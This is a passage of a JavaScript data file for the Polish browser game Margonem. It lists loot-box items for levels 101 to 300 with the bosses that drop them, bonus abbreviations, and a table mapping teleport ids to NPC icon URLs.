      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/przeraza.gif"
    }]
  }, {
    tier: 2,
    id: 59458,
    name: "Solidna skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2939;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Stalowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_12.gif",
    drop: [{
      nick: "Miłośnik rycerzy",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_rycerzy.gif"
    }, {
      nick: "Borgoros Garamir III",
      lvl: 124,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif"
    }, {
      nick: "Henry Kaprawe Oko",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e1/pirat5b.gif"
    }, {
      nick: "Wójt Fistuła",
      lvl: 144,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif"
    }, {
      nick: "Burkog Lorulk",
      lvl: 160,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif"
    }, {
      nick: "Ziuggrael Strażnik Królowej",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_woj_elita.gif"
    }, {
      nick: "Wrzosera",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wrzosera-1b.gif"
    }, {
      nick: "Breheret Żelazny Łeb",
      lvl: 192,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/draki-breheret-1b.gif"
    }]
  }, {
    tier: 2,
    id: 59459,
    name: "Solidna skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2940;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Ognisty komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_08.gif",
    drop: [{
      nick: "Jertek Moxos",
      lvl: 105,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/moloch-jertek.gif"
    }, {
      nick: "Łowca czaszek",
      lvl: 112,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/alghul-czaszka-1a.gif"
    }, {
      nick: "Ifryt",
      lvl: 128,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magradit_ifryt.gif"
    }, {
      nick: "Mistrz Worundriel",
      lvl: 139,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif"
    }, {
      nick: "Fodug Zolash",
      lvl: 150,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif"
    }, {
      nick: "Sheba Orcza Szamanka",
      lvl: 160,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif"
    }, {
      nick: "Lusgrathera Królowa Pramatka",
      lvl: 175,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/prakrolowa.gif"
    }, {
      nick: "Pięknotka Mięsożerna",
      lvl: 189,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zmutowana-roslinka.gif"
    }, {
      nick: "Mysiur Myświórowy Król",
      lvl: 197,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mysiur_myswiorowy_krol-1a.gif"
    }]
  }, {
    tier: 2,
    id: 59460,
    name: "Solidna skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2941;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_10.gif",
    drop: [{
      nick: "Miłośnik magii",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_magii.gif"
    }, {
      nick: "Morski potwór",
      lvl: 118,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif"
    }, {
      nick: "Stworzyciel",
      lvl: 125,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif"
    }, {
      nick: "Eol",
      lvl: 135,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif"
    }, {
      nick: "Berserker Amuno",
      lvl: 148,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif"
    }, {
      nick: "Duch Władcy Klanów",
      lvl: 165,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/duch_wladcy_kl.gif"
    }, {
      nick: "Królowa Śniegu",
      lvl: 175,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif"
    }, {
      nick: "Ogr Stalowy Pazur",
      lvl: 183,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif"
    }, {
      nick: "Sadolia Nadzorczyni Hurys",
      lvl: 200,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sadolia.gif"
    }]
  }, {
    tier: 2,
    id: 59461,
    name: "Solidna skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2942;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Elektryczny komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_18.gif",
    drop: [{
      nick: "Kambion",
      lvl: 101,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kambion.gif"
    }, {
      nick: "Ozirus Władca Hieroglifów",
      lvl: 115,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mumia-ozirus.gif"
    }, {
      nick: "Helga Opiekunka Rumu",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif"
    }, {
      nick: "Teściowa Rumcajsa",
      lvl: 145,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-tesciowa-rumcajsa.gif"
    }, {
      nick: "Adariel",
      lvl: 155,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri_adariel.gif"
    }, {
      nick: "Fursharag Pożeracz Umysłów",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_mag_elita.gif"
    }, {
      nick: "Chryzoprenia",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia-1a.gif"
    }, {
      nick: "Torunia Ankelwald",
      lvl: 186,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/thuz-patr1.gif"
    }]
  }, {
    tier: 2,
    id: 59462,
    name: "Solidna skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2943;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200. Szansa na Jadowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_16.gif",
    drop: [{
      nick: "Miłośnik łowców",
      lvl: 108,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_lowcow.gif"
    }, {
      nick: "Krab pustelnik",
      lvl: 124,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif"
    }, {
      nick: "Młody Jack Truciciel",
      lvl: 131,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif"
    }, {
      nick: "Grubber Ochlaj",
      lvl: 136,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif"
    }, {
      nick: "Goons Asterus",
      lvl: 154,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif"
    }, {
      nick: "Bragarth Myśliwy Dusz",
      lvl: 170,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/praork_low_elita.gif"
    }, {
      nick: "Cantedewia",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cantedewia-1a.gif"
    }, {
      nick: "Cerasus",
      lvl: 193,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cerasus-1a.gif"
    }]
  }, {
    tier: 3,
    id: 59492,
    name: "Ciężka skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2944;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_13.gif",
    drop: [{
      nick: "Demonis Pan Nicości",
      lvl: 205,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/sekta_demon_cz_s.gif"
    }, {
      nick: "Mulher Ma",
      lvl: 214,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/mulher_ma.gif"
    }, {
      nick: "Vapor Veneno",
      lvl: 231,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/joziniec_bagienny.gif"
    }, {
      nick: "Dęborożec",
      lvl: 244,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zwierz_kniei.gif"
    }, {
      nick: "Tepeyollotl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/tep_35ecb966.gif"
    }, {
      nick: "Widmo Triady",
      lvl: 265,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/trist2_widmo_triady.gif"
    }, {
      nick: "Negthotep Czarny Kapłan",
      lvl: 271,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/negthotep.gif"
    }, {
      nick: "Młody Smok",
      lvl: 282,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/smokbarb.gif"
    }]
  }, {
    tier: 3,
    id: 59493,
    name: "Ciężka skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2945;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Stalowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_11.gif",
    drop: [{
      nick: "Gothardus Kolekcjoner Głów",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-gothardus.gif"
    }, {
      nick: "Czempion Furboli",
      lvl: 210,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/forbol03.gif"
    }, {
      nick: "Tolypeutes",
      lvl: 245,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bolita.gif"
    }, {
      nick: "Wabicielka",
      lvl: 260,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/trist2_wabicielka-1a.gif"
    }, {
      nick: "Chopesz",
      lvl: 267,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chopesh2.gif"
    }, {
      nick: "Zorin",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu01.gif"
    }]
  }, {
    tier: 3,
    id: 59494,
    name: "Ciężka skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2946;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Ognisty komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_07.gif",
    drop: [{
      nick: "Annaniel Wysysacz Marzeń",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-annaniel.gif"
    }, {
      nick: "Marlloth Malignitas",
      lvl: 220,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drider-marlloth.gif"
    }, {
      nick: "Terrozaur",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif"
    }, {
      nick: "Cuaitl Citlalin",
      lvl: 250,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maho-cuaitl.gif"
    }, {
      nick: "Pogardliwa Sybilla",
      lvl: 263,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri2_witch_e2.gif"
    }, {
      nick: "Artenius",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu03.gif"
    }]
  }, {
    tier: 3,
    id: 59496,
    name: "Ciężka skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2947;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_09.gif",
    drop: [{
      nick: "Zufulus Smakosz Serc",
      lvl: 205,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-zufulus.gif"
    }, {
      nick: "Arytodam olbrzymi",
      lvl: 226,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/arytodam_olbrzymi-1b.gif"
    }, {
      nick: "Mocny Maddoks",
      lvl: 231,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mocny_maddoks-1b.gif"
    }, {
      nick: "Quetzalcoatl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif"
    }, {
      nick: "Nymphemonia",
      lvl: 287,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif"
    }]
  }, {
    tier: 3,
    id: 59497,
    name: "Ciężka skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2948;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Elektryczny komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_17.gif",
    drop: [{
      nick: "Bergermona Krwawa Hrabina",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-bergermona.gif"
    }, {
      nick: "Al'diphrin Ilythirahel",
      lvl: 218,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drow-aldiphrin-wladca.gif"
    }, {
      nick: "Fangaj",
      lvl: 235,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif"
    }, {
      nick: "Neferkar Set",
      lvl: 274,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif"
    }, {
      nick: "Vaenra Charkhaam",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif"
    }]
  }, {
    tier: 3,
    id: 59498,
    name: "Ciężka skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2949;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 201-300. Szansa na Jadowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_15.gif",
    drop: [{
      nick: "Sataniel Skrytobójca",
      lvl: 204,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif"
    }, {
      nick: "Arachniregina Colosseus",
      lvl: 214,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif"
    }, {
      nick: "Dendroculus",
      lvl: 240,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dendroculus.gif"
    }, {
      nick: "Chaegd Agnrakh",
      lvl: 280,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smokoszef.gif"
    }, {
      nick: "Yaotl",
      lvl: 258,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mahoplowca.gif"
    }, {
      nick: "Furion",
      lvl: 300,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu02.gif"
    }]
  }];
}
export function getBonusShortName() {
  return {
    cleanse: "PO",
    facade: "FO",
    anguish: "KU",
    puncture: "PS",
    frenzy: "ES",
    retaliation: "AO",
    curse: "KL",
    glare: "OS",
    critred: "KO",
    holytouch: "DA",
    verycrit: "CK",
    lastheal: "OR"
  };
}
export function getDataIcons() {
  return {
    teleport: {
      "1741": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif",
      "3149": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobsamurai.gif",
      "2729": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kobold07.gif",
      "2532": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-e2-zorg.gif",
      "7864": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drider-marlloth.gif",
      "7375": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif",
      "7369": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krab_big3.gif",
      "2308": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-szczet.gif",
      "727": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobmag2.gif",
      "7693": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif",
      "7692": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_stalowy_pazur-1a.gif",
      "610": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/npc393.gif",
      "344": "https://micc.garmory-cdn.cloud/obrazki/npc/kob/tunia.gif",
      "353": "https://micc.garmory-cdn.cloud/obrazki/npc/kob/tunia.gif",
      "1224": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/tuz31.gif",
      "630": "https://micc.garmory-cdn.cloud/obrazki/npc/mez/tuz31.gif",
      "3361": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/mamlambo_final2.gif",
      "3883": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/bazyliszek.gif",
      "7353": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wodnik.gif",
      "1739": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wodnik.gif",
      "4046": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/soploreki.gif",
      "4066": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "3535": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "264": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/hydrokora.gif",
      "4161": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wazka.gif",
      "1876": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-wazka.gif",
      "4196": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolkrucz.gif",
      "4206": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-pajak.gif",
      "1131": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-pajak.gif",
      "4266": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-dendro.gif",
      "4268": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-drakolisz.gif",
      "6949": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/renegat_baulus.gif",
      "189": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/dziewicza_orlica.gif",
      "1746": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/zabojczy_krolik.gif",
      "7060": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/archdemon.gif",
      "7477": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/versus-zoons.gif",
      "7475": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/versus-zoons.gif",
      "6477": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/lowcz-wspo-driady.gif",
      "6476": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/przyz_demon_sekta.gif",
      "7848": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/maddok_magua-1b.gif",
      "5709": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/tezcatlipoca.gif",
      "3312": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/hebrehoth_smokoludzie.gif",
      "2355": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/ice_king.gif",
      "177": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/glut_agar.gif",
      "229": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kambion.gif",
      "7057": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magradit_ifryt.gif",
      "7069": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mumia-ozirus.gif",
      "1525": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif",
      "1527": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat-2b.gif",
      "3409": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif",
      "1526": "https://micc.garmory-cdn.cloud/obrazki/npc/e1/pirat5b.gif",
      "5941": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-gothardus.gif",
      "5940": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sadolia.gif",
      "5945": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-bergermona.gif",
      "7694": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif",
      "7695": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-sataniel.gif",
      "8181": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif",
      "8180": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grzyb-humanoid-1b.gif",
      "5943": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/sekta-zufulus.gif",
      "6956": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6955": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6944": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_rycerzy.gif",
      "6946": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_magii.gif",
      "6945": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/blotniaki_milosnik_lowcow.gif",
      "1238": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif",
      "7345": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krolowa-sniegu.gif",
      "6938": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/moloch-jertek.gif",
      "5872": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/duch_wladcy_kl.gif",
      "1912": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/forbol03.gif",
      "2063": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/draki-breheret-1b.gif",
      "7701": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mysiur_myswiorowy_krol-1a.gif",
      "7827": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/arytodam_olbrzymi-1b.gif",
      "7859": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/drow-aldiphrin-wladca.gif",
      "1481": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok5.gif",
      "1142": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif",
      "1159": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/regina-e2.gif",
      "5660": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bolita.gif",
      "1462": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok_roz.gif",
      "7843": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mocny_maddoks-1b.gif",
      "3597": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dendroculus.gif",
      "6634": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif",
      "6636": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif",
      "3039": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif",
      "7465": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif",
      "7466": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/worundriel02.gif",
      "3627": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/silvanasus.gif",
      "5694": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mahoplowca.gif",
      "3466": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ugrape2.gif",
      "2761": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral05.gif",
      "1101": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral08.gif",
      "5855": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif",
      "5856": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/orkczd.gif",
      "5849": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif",
      "6064": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif",
      "6063": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nymphemonia.gif",
      "3035": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chopesh2.gif",
      "4056": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri2_witch_e2.gif",
      "3339": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif",
      "3327": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif",
      "2356": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu02.gif",
      "2354": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu01.gif",
      "2353": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wl-mrozu03.gif",
      "3335": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/terrorzaur_pus.gif",
      "1901": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maho-cuaitl.gif",
      "6053": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/thuz-patr1.gif",
      "1641": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/minotaur-elita.gif",
      "2526": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ogr_drapak.gif",
      "2766": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/marlloth.gif",
      "3409": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/pirat01.gif",
      "359": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mechgoblin4.gif",
      "3341": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smokoszef.gif",
      "3037": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-drakolisz.gif",
      "1204": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wlochacze_wielka_stopa.gif",
      "6625": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lisz_demilisze.gif",
      "6632": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_atamatu.gif",
      "6623": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nieu_mnich_grabarz.gif",
      "6537": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kam_olbrzym-b.gif",
      "1325": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif",
      "1324": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif",
      "6774": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krasnolud_boss.gif",
      "3765": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cent-zyfryd.gif",
      "5851": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif",
      "6615": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magaz_zbrojmistrz.gif",
      "5862": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/prakrolowa.gif",
      "5684": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif",
      "5683": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif",
      "3038": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif",
